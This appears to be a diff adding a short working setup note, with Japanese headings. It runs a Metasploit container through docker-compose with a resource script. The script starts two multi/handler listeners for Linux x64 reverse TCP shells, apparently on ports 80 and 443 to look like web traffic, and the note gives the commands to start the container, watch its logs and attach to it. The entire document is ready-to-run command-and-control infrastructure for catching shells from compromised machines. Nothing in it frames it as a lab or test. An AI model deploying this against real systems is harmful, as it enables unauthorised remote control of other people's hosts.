@@ -1,0 +1,47 @@
+msfconsole 
+
+docker-compose.yml
+
+version: '3.8'
+
+services:
+  msf-handler:
+    image: metasploitframework/metasploit-framework
+    container_name: msf-handler
+    stdin_open: true
+    tty: true
+    ports:
+      - "80:80"
+      - "443:443"
+    volumes:
+      - ./resource.rc:/usr/src/metasploit-framework/resource.rc:ro
+    # msfconsole の絶対パスを指定
+    command: /usr/src/metasploit-framework/msfconsole -r /usr/src/metasploit-framework/resource.rc
+
+
+resource.rc
+
+# --- Handler 1: Port 80 ---
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 80
+set ExitOnSession false
+exploit -j
+
+# --- Handler 2: Port 443 ---
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 443
+set ExitOnSession false
+exploit -j
+
+起動
+docker compose up -d
+
+確認
+docker logs -f msf-handler
+
+入る
+docker attach msf-handler
